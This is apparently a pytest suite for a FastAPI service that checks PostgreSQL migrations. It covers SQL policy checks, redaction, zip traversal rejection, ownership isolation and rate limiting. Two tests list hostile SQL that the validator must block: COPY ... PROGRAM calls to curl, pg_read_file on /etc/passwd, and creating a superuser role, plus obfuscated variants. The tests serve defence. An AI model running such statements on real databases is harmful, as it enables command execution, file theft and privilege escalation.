from __future__ import annotations

import io
import zipfile
from datetime import UTC, datetime, timedelta

import pytest
from fastapi import HTTPException, status
from fastapi.testclient import TestClient

from app.core.clerk_auth import get_clerk_user_id
from app.main import create_app
from app.rollbackready.artifacts import InMemoryArtifactStore
from app.rollbackready.contracts import (
    AnalysisStatus,
    EvidenceLevel,
    EvidenceReport,
    EvidenceSource,
    EvidenceStatus,
    PlanPhase,
    PlanState,
    RecoveryPlan,
    Severity,
    Verdict,
)
from app.rollbackready.errors import RollbackReadyError
from app.rollbackready.intake import (
    build_demo_archive,
    load_demo_bundle,
    load_project_bundle,
)
from app.rollbackready.persistence import NullEvidenceRepository
from app.rollbackready.risk import analyze_risks
from app.rollbackready.sandbox import PostgresSandbox
from app.rollbackready.service import AnalysisService
from app.rollbackready.simulation import SimulationOutcome, empty_dimensions
from app.rollbackready.sql import redact_sql, split_sql, validate_sql_policy

OWNER_A = "user_owner_a"
OWNER_B = "user_owner_b"
IDEMPOTENCY_HEADERS = {"Idempotency-Key": "test-key-0001"}


class _FakeSimulator:
    def __init__(self, verify_error: RollbackReadyError | None = None) -> None:
        self.verify_error = verify_error

    def run(self, *_: object) -> SimulationOutcome:
        dimensions = empty_dimensions()
        schema_application = next(
            item for item in dimensions if item.key == "schema_application"
        )
        schema_application.status = EvidenceStatus.FAIL
        schema_application.source = EvidenceSource.FIXTURE_EXECUTION
        schema_application.summary = "Synthetic constraint conflict confirmed."
        return SimulationOutcome(
            dimensions,
            [],
            [],
            "Column contains null values.",
        )

    def verify_plan(self, *_: object) -> SimulationOutcome:
        if self.verify_error is not None:
            raise self.verify_error
        mandatory = {
            "prior_migrations",
            "fixture_load",
            "schema_application",
            "data_preservation",
            "legacy_queries",
            "failure_recovery",
            "idempotent_retry",
        }
        dimensions = empty_dimensions()
        for dimension in dimensions:
            if dimension.key in mandatory:
                dimension.status = EvidenceStatus.PASS
                dimension.source = EvidenceSource.PLAN_VERIFICATION
                dimension.summary = "Verified from a clean baseline."
        return SimulationOutcome(dimensions, [], [], None)


class _FakePlanner:
    def generate(self, analysis_id: str, *_: object) -> RecoveryPlan:
        return RecoveryPlan(
            id="plan-1",
            analysis_id=analysis_id,
            state=PlanState.UNVERIFIED_CANDIDATE,
            provider="deterministic-fallback",
            model="deterministic-v1",
            prompt_template_version="test-v1",
            generated_at=datetime.now(UTC),
            deterministic_fallback=True,
            strategy="Expand and contract",
            summary="Add the column as nullable before enforcing the constraint.",
            phases=[
                PlanPhase(
                    name="Expand",
                    objective="Preserve compatibility.",
                    sql=['ALTER TABLE "users" ADD COLUMN "phone" TEXT'],
                    verification_sql=["SELECT TRUE"],
                    rollback_guidance="Use a forward fix if writes depend on the column.",
                )
            ],
        )


class _MemoryRepository:
    def __init__(self) -> None:
        self.reports: dict[tuple[str, str], EvidenceReport] = {}

    def save(self, report: EvidenceReport, owner_clerk_user_id: str) -> None:
        key = (report.analysis.id, owner_clerk_user_id)
        self.reports[key] = report.model_copy(deep=True)

    def get(
        self, analysis_id: str, owner_clerk_user_id: str
    ) -> EvidenceReport | None:
        report = self.reports.get((analysis_id, owner_clerk_user_id))
        return report.model_copy(deep=True) if report is not None else None

    def delete(self, analysis_id: str, owner_clerk_user_id: str) -> None:
        self.reports.pop((analysis_id, owner_clerk_user_id), None)

    def delete_expired(self, expired_before: datetime) -> None:
        self.reports = {
            key: report
            for key, report in self.reports.items()
            if report.analysis.expires_at > expired_before
        }


def test_demo_bundle_has_complete_postgresql_evidence() -> None:
    bundle = load_demo_bundle()

    assert bundle.manifest.provider == "postgresql"
    assert bundle.evidence_level is EvidenceLevel.SANDBOX_SIMULATED
    assert len(bundle.prior_migrations) == 1
    assert len(bundle.legacy_queries) == 2


def test_native_sandbox_keeps_binaries_resolved_during_initialization(
    monkeypatch,
) -> None:
    resolved = {
        "initdb": "/postgres/bin/initdb",
        "pg_ctl": "/postgres/bin/pg_ctl",
        "psql": "/postgres/bin/psql",
    }

    def resolve_backend(sandbox: PostgresSandbox) -> str:
        sandbox._binaries = resolved.copy()
        return "native"

    monkeypatch.setattr(PostgresSandbox, "_resolve_backend", resolve_backend)

    sandbox = PostgresSandbox("native-runtime-regression")

    assert sandbox._backend == "native"
    assert sandbox._binaries == resolved


def test_native_sandbox_redirects_postgres_server_output(
    monkeypatch,
    tmp_path,
) -> None:
    resolved = {
        "initdb": "/postgres/bin/initdb",
        "pg_ctl": "/postgres/bin/pg_ctl",
        "psql": "/postgres/bin/psql",
    }

    def resolve_backend(sandbox: PostgresSandbox) -> str:
        sandbox._binaries = resolved.copy()
        return "native"

    root = tmp_path / "sandbox"
    root.mkdir()
    commands: list[list[str]] = []
    monkeypatch.setattr(PostgresSandbox, "_resolve_backend", resolve_backend)
    monkeypatch.setattr(
        "app.rollbackready.sandbox.tempfile.mkdtemp",
        lambda **_: str(root),
    )

    sandbox = PostgresSandbox("native-log-regression")
    monkeypatch.setattr(sandbox, "_run", lambda command: commands.append(command))

    sandbox._start_native()

    pg_ctl = commands[1]
    log_index = pg_ctl.index("--log")
    assert pg_ctl[log_index + 1] == str(root / "postgres.log")


def test_unsafe_phone_demo_matches_constraint_and_compatibility_rules() -> None:
    findings = analyze_risks(load_demo_bundle())

    assert {finding.category for finding in findings} == {
        "CONSTRAINT_EXISTING_DATA",
        "BACKWARD_INCOMPATIBILITY",
    }
    assert all(finding.severity is Severity.HIGH for finding in findings)


def test_sql_splitter_preserves_semicolons_inside_literals_and_comments() -> None:
    statements = split_sql(
        "INSERT INTO notes(value) VALUES ('a;b'); -- ignored ;\nALTER TABLE notes ADD COLUMN tag TEXT;"
    )

    assert len(statements) == 2
    assert "'a;b'" in statements[0]
    assert statements[1].endswith("ADD COLUMN tag TEXT")


def test_sql_redaction_removes_literals() -> None:
    redacted = redact_sql(
        "UPDATE users SET email='private@example.com', "
        "note=$$fixture secret$$, tag=$safe$another secret$safe$ WHERE id=42"
    )

    assert "private@example.com" not in redacted
    assert "fixture secret" not in redacted
    assert "another secret" not in redacted
    assert "42" not in redacted
    assert redacted.count("?") == 4


@pytest.mark.parametrize(
    "sql",
    [
        "CREATE ROLE attacker SUPERUSER",
        "COPY users TO PROGRAM 'curl example.com'",
        "CREATE EXTENSION dblink",
        "SELECT pg_read_file('/etc/passwd')",
        "CREATE SERVER remote FOREIGN DATA WRAPPER postgres_fdw",
    ],
)
def test_server_level_sql_is_rejected(sql: str) -> None:
    with pytest.raises(RollbackReadyError, match="unsafe operation"):
        validate_sql_policy(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "CREATE/**/ROLE attacker SUPERUSER",
        'SELECT pg_catalog."pg_sleep"(1)',
        'SELECT "pg_read_file"(\'/etc/passwd\')',
        "DO $$ BEGIN PERFORM 1; END $$",
        "CREATE FUNCTION exploit() RETURNS void LANGUAGE plpgsql AS $$ BEGIN END $$",
        "BEGIN",
        "PREPARE TRANSACTION 'escape'",
        "COPY users FROM PROGRAM 'curl example.com'",
    ],
)
def test_obfuscated_and_transaction_abuse_is_rejected(sql: str) -> None:
    with pytest.raises(RollbackReadyError) as error:
        validate_sql_policy(sql)

    assert error.value.code == "UNSUPPORTED_SQL"


@pytest.mark.parametrize(
    "sql",
    [
        'CREATE TABLE "User" ("id" TEXT PRIMARY KEY)',
        'ALTER TABLE "User" ADD COLUMN "email" TEXT',
        'CREATE UNIQUE INDEX "User_email_key" ON "User"("email")',
        'DROP INDEX "User_email_key"',
        'CREATE TYPE "Mood" AS ENUM (\'HAPPY\', \'SAD\')',
        'COMMENT ON TABLE "User" IS \'managed by prisma\'',
    ],
)
def test_supported_prisma_migration_shapes_pass_policy(sql: str) -> None:
    assert validate_sql_policy(sql)


def test_malformed_or_nul_sql_fails_closed() -> None:
    for sql in ("SELECT (", "SELECT \x00"):
        with pytest.raises(RollbackReadyError) as error:
            validate_sql_policy(sql)
        assert error.value.code == "INVALID_SQL"


def test_zip_traversal_is_rejected() -> None:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("../migration.sql", "SELECT 1")

    with pytest.raises(RollbackReadyError) as error:
        load_project_bundle(buffer.getvalue(), "candidate")

    assert error.value.code == "ZIP_TRAVERSAL"


def test_incomplete_bundle_remains_static_analysis_only() -> None:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr(
            "prisma/migrations/20260809100000_add_optional/migration.sql",
            "ALTER TABLE users ADD COLUMN nickname TEXT",
        )
    bundle = load_project_bundle(buffer.getvalue(), "20260809100000_add_optional")
    service = AnalysisService()

    staged = service.create(bundle, OWNER_A)
    completed = service.run(staged.id, OWNER_A)

    assert completed.evidence_level is EvidenceLevel.STATIC_ANALYSIS_ONLY
    assert completed.verdict == "INSUFFICIENT_EVIDENCE"
    assert all(item.status == "NOT_TESTED" for item in completed.evidence)


def test_demo_endpoint_stages_without_accepting_a_production_url() -> None:
    application = create_app(dict)
    application.dependency_overrides[get_clerk_user_id] = lambda: OWNER_A
    with TestClient(application) as client:
        response = client.post(
            "/api/v1/analyses",
            data={"use_demo": "true", "database_url": "postgresql://production"},
            headers=IDEMPOTENCY_HEADERS,
        )

    assert response.status_code == 201
    body = response.json()
    assert body["provider"] == "postgresql"
    assert "database_url" not in body


def test_create_idempotency_replays_without_duplicate_analysis() -> None:
    application = create_app(dict)
    application.dependency_overrides[get_clerk_user_id] = lambda: OWNER_A
    with TestClient(application) as client:
        first = client.post(
            "/api/v1/analyses",
            data={"use_demo": "true"},
            headers={"Idempotency-Key": "same-create-key"},
        )
        replay = client.post(
            "/api/v1/analyses",
            data={"use_demo": "true"},
            headers={"Idempotency-Key": "same-create-key"},
        )

    assert first.status_code == status.HTTP_201_CREATED
    assert replay.status_code == status.HTTP_201_CREATED
    assert replay.json()["id"] == first.json()["id"]
    assert first.headers["idempotency-replayed"] == "false"
    assert replay.headers["idempotency-replayed"] == "true"


def test_invalid_create_releases_idempotency_key_for_retry() -> None:
    application = create_app(dict)
    application.dependency_overrides[get_clerk_user_id] = lambda: OWNER_A
    headers = {"Idempotency-Key": "retry-after-invalid"}
    with TestClient(application) as client:
        invalid = client.post("/api/v1/analyses", headers=headers)
        retried = client.post(
            "/api/v1/analyses",
            data={"use_demo": "true"},
            headers=headers,
        )

    assert invalid.status_code == status.HTTP_400_BAD_REQUEST
    assert retried.status_code == status.HTTP_201_CREATED


def test_raw_artifact_is_deleted_after_plan_verification() -> None:
    artifact_store = InMemoryArtifactStore()
    service = AnalysisService(
        simulator=_FakeSimulator(),
        planner=_FakePlanner(),
        repository=NullEvidenceRepository(),
        artifact_store=artifact_store,
    )
    archive = build_demo_archive()
    staged = service.create(load_demo_bundle(), OWNER_A, archive)
    object_name = f"analyses/{staged.id}/bundle.zip"

    assert staged.raw_artifacts_available
    service.run(staged.id, OWNER_A)
    plan = service.create_plan(staged.id, OWNER_A)
    service.verify_plan(staged.id, plan.id, OWNER_A)

    assert not service.get(staged.id, OWNER_A).raw_artifacts_available
    with pytest.raises(RollbackReadyError) as error:
        artifact_store.get(object_name, "1")
    assert error.value.code == "RAW_ARTIFACTS_DELETED"


def test_verified_recovery_plan_does_not_replace_unsafe_candidate_verdict() -> None:
    simulator = _FakeSimulator()
    service = AnalysisService(
        simulator=simulator,
        planner=_FakePlanner(),
        repository=NullEvidenceRepository(),
    )
    staged = service.create(load_demo_bundle(), OWNER_A)
    candidate = service.run(staged.id, OWNER_A)
    plan = service.create_plan(staged.id, OWNER_A)

    verification = service.verify_plan(staged.id, plan.id, OWNER_A)
    completed = service.get(staged.id, OWNER_A)

    assert candidate.verdict is Verdict.UNSAFE
    assert verification.verdict is Verdict.VERIFIED_FOR_REVIEW
    assert completed.verdict is Verdict.UNSAFE
    assert completed.status is AnalysisStatus.VERIFIED_PLAN
    assert completed.plans[0].state is PlanState.VERIFIED_FOR_REVIEW


def test_transient_plan_verification_error_remains_retryable() -> None:
    simulator = _FakeSimulator(
        RollbackReadyError(
            "SIMULATOR_BUSY",
            "This instance is already running a simulation. Retry shortly.",
            status_code=409,
        )
    )
    service = AnalysisService(
        simulator=simulator,
        planner=_FakePlanner(),
        repository=NullEvidenceRepository(),
    )
    staged = service.create(load_demo_bundle(), OWNER_A)
    service.run(staged.id, OWNER_A)
    plan = service.create_plan(staged.id, OWNER_A)

    with pytest.raises(RollbackReadyError, match="already running"):
        service.verify_plan(staged.id, plan.id, OWNER_A)

    retryable = service.get(staged.id, OWNER_A)
    assert retryable.status is AnalysisStatus.UNSAFE
    assert retryable.verdict is Verdict.UNSAFE
    assert retryable.plans[0].state is PlanState.UNVERIFIED_CANDIDATE
    assert service.timeline(staged.id, OWNER_A)[-1].event_type == "PLAN_VERIFICATION_ERROR"

    simulator.verify_error = None
    assert (
        service.verify_plan(staged.id, plan.id, OWNER_A).status
        is EvidenceStatus.PASS
    )


def test_analysis_ownership_hides_every_operation_from_other_users() -> None:
    service = AnalysisService(
        simulator=_FakeSimulator(),
        planner=_FakePlanner(),
        repository=NullEvidenceRepository(),
    )
    staged = service.create(load_demo_bundle(), OWNER_A)
    service.run(staged.id, OWNER_A)
    plan = service.create_plan(staged.id, OWNER_A)

    operations = [
        lambda: service.get(staged.id, OWNER_B),
        lambda: service.run(staged.id, OWNER_B),
        lambda: service.timeline(staged.id, OWNER_B),
        lambda: service.create_plan(staged.id, OWNER_B),
        lambda: service.verify_plan(staged.id, plan.id, OWNER_B),
        lambda: service.report(staged.id, OWNER_B),
        lambda: service.delete(staged.id, OWNER_B),
    ]
    for operation in operations:
        with pytest.raises(RollbackReadyError) as raised:
            operation()
        assert raised.value.status_code == status.HTTP_404_NOT_FOUND
        assert raised.value.code == "ANALYSIS_NOT_FOUND"

    assert service.get(staged.id, OWNER_A).id == staged.id


def test_persistence_hydration_retains_analysis_ownership() -> None:
    repository = _MemoryRepository()
    staged = AnalysisService(repository=repository).create(
        load_demo_bundle(), OWNER_A
    )
    hydrated_service = AnalysisService(repository=repository)

    assert hydrated_service.get(staged.id, OWNER_A).id == staged.id
    with pytest.raises(RollbackReadyError) as raised:
        hydrated_service.get(staged.id, OWNER_B)
    assert raised.value.status_code == status.HTTP_404_NOT_FOUND


def test_expiry_sweep_removes_abandoned_raw_bundle_and_report() -> None:
    repository = _MemoryRepository()
    service = AnalysisService(repository=repository)
    staged = service.create(load_demo_bundle(), OWNER_A)

    removed = service.purge_expired(
        staged.expires_at + timedelta(seconds=1)
    )

    assert removed == 1
    assert repository.reports == {}
    with pytest.raises(RollbackReadyError) as raised:
        service.get(staged.id, OWNER_A)
    assert raised.value.status_code == status.HTTP_404_NOT_FOUND


def test_product_routes_require_authentication_while_system_routes_stay_public() -> None:
    application = create_app(dict)

    def reject_unsigned_request() -> str:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Authentication required",
        )

    application.dependency_overrides[get_clerk_user_id] = reject_unsigned_request
    with TestClient(application) as client:
        product_response = client.post(
            "/api/v1/analyses",
            data={"use_demo": "true"},
            headers=IDEMPOTENCY_HEADERS,
        )
        root_response = client.get("/")
        health_response = client.get("/health")
        docs_response = client.get("/docs")

    assert product_response.status_code == status.HTTP_401_UNAUTHORIZED
    assert root_response.status_code == status.HTTP_200_OK
    assert health_response.status_code == status.HTTP_200_OK
    assert docs_response.status_code == status.HTTP_200_OK


def test_error_envelope_and_response_echo_valid_request_id() -> None:
    application = create_app(dict)

    def reject_unsigned_request() -> str:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Authentication required",
        )

    application.dependency_overrides[get_clerk_user_id] = reject_unsigned_request
    with TestClient(application) as client:
        response = client.post(
            "/api/v1/analyses",
            data={"use_demo": "true"},
            headers={
                "Idempotency-Key": "request-id-auth",
                "X-Request-ID": "request_12345678",
            },
        )

    assert response.headers["x-request-id"] == "request_12345678"
    assert response.json()["error"]["request_id"] == "request_12345678"


def test_api_returns_not_found_for_another_authenticated_owner() -> None:
    application = create_app(dict)
    application.dependency_overrides[get_clerk_user_id] = lambda: OWNER_A
    with TestClient(application) as client:
        created = client.post(
            "/api/v1/analyses",
            data={"use_demo": "true"},
            headers=IDEMPOTENCY_HEADERS,
        )
        analysis_id = created.json()["id"]
        application.dependency_overrides[get_clerk_user_id] = lambda: OWNER_B
        hidden = client.get(f"/api/v1/analyses/{analysis_id}")

    assert created.status_code == status.HTTP_201_CREATED
    assert hidden.status_code == status.HTTP_404_NOT_FOUND
    assert hidden.json()["error"]["code"] == "ANALYSIS_NOT_FOUND"


def test_analysis_create_rate_limit_returns_retry_header() -> None:
    application = create_app(dict)
    application.dependency_overrides[get_clerk_user_id] = lambda: OWNER_A
    with TestClient(application) as client:
        responses = []
        for index in range(11):
            response = client.post(
                "/api/v1/analyses",
                data={"use_demo": "true"},
                headers={"Idempotency-Key": f"rate-key-{index:04d}"},
            )
            responses.append(response)
            if response.status_code == status.HTTP_201_CREATED:
                client.delete(f"/api/v1/analyses/{response.json()['id']}")

    assert all(response.status_code == 201 for response in responses[:10])
    assert responses[-1].status_code == status.HTTP_429_TOO_MANY_REQUESTS
    assert responses[-1].headers["retry-after"]
    assert responses[-1].json()["error"]["code"] == "RATE_LIMITED"
